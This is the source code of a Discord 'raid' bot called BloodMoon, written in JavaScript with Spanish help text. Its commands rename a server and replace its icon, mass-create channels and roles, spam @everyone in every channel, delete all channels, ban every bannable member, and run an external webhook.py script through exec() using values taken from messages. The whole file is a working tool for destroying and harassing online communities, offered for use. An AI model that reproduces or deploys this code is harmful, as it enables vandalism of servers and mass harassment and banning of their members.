const { Client, MessageEmbed, Message  } = require("discord.js");
const client = new Client();
const config = require("./config.json");
const { exec } = require("child_process");
var prefix = config.prefix;
client.on("ready", () => {
    console.log("Listo para el desmadre");
    client.user.setActivity("#BloodMoon Motherfucker");
});
client.on("message", async message => {
    const args = message.content.slice(prefix.lenght).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
    if(!message.content.startsWith(prefix)) return;
    if(message.author.bot) return;
    switch (command){
        case("!help"):
            const Menu = new MessageEmbed()
            .setTitle("**Bienvenido al Menú de BloodMoon**")
            .setColor("#e60000")
            .setDescription("Aquí encontrarás todos los comandos del Bot con una breve descripción de lo que hace cada uno.")
            .setImage("https://media.discordapp.net/attachments/779901924652613632/779905673705291826/unknown.png?width=450&height=450")
            .addField("!help", "Muestra todos los comandos del Bot en un mensaje Embed.")
            .addField("!fuck", "Creará 100 canales Además también cambia el ícono y el nombre del server.")
            .addField("!kill", "Enviará el Spam a todos los canales creados.")
            .addField("!blow", "Borrará todos los canales del servidor y creará uno nuevo para colocar los comandos.")
            .addField("!rolz", "Hará 100 Roles anunciando la victoria de BloodMoon.")
            .addField("!harakiri","Banea a todos los usuarios del servidor, obviamente también te baneará a ti.")
            .setFooter("Bot By: Nevers0ft_#6666 & Narchen#6666")
            message.channel.send(Menu);
            break;
        case("!fuck"):
            message.delete();
            message.guild.setName("Pwned By BloodMoon")
            message.guild.setIcon("https://media.discordapp.net/attachments/779901924652613632/779905673705291826/unknown.png?width=450&height=450")
            for(i = 0; i <= 100; i++){message.guild.channels.create("raid-by-bloodmoon", {type:"text"});}
            break;
        case("!blow"):
        var server_id = message.member.guild.id;
        var user_id = message.member.user.id;
            exec("python3 webhook.py" + " " + user_id + " " +server_id, (error, stdout, stderr) => {
                if (error) {
                    console.log(`error: ${error.message}`);
                    return;
                }
                if (stderr) {
                    console.log(`stderr: ${stderr}`);
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
            try{message.guild.channels.cache.forEach(channel => {channel.delete();})} catch (error){console.error(error)}
            message.guild.channels.create("raid-by-bloodmoon", {type:"text"});
            break;
        case("!kill"):
            message.guild.channels.cache.forEach(channel => {
                for(a = 0; a <= 9; a++){channel.send("@everyone BloodMoon is here, fucker https://media.discordapp.net/attachments/779901924652613632/779905673705291826/unknown.png?width=450&height=450")}
            })
            break;
        case("!rolz"):
            for (e = 0; e <= 99; e++){message.guild.roles.create({data: {name: "BloodMoonWins", color: "RANDOM"}});}
            break;
        case("!harakiri"):
            try{message.guild.members.cache.filter(member => member.bannable).forEach(member => member.ban());}
            catch(error){console.error(error)}
            break;
    }
});
client.login(config.token);
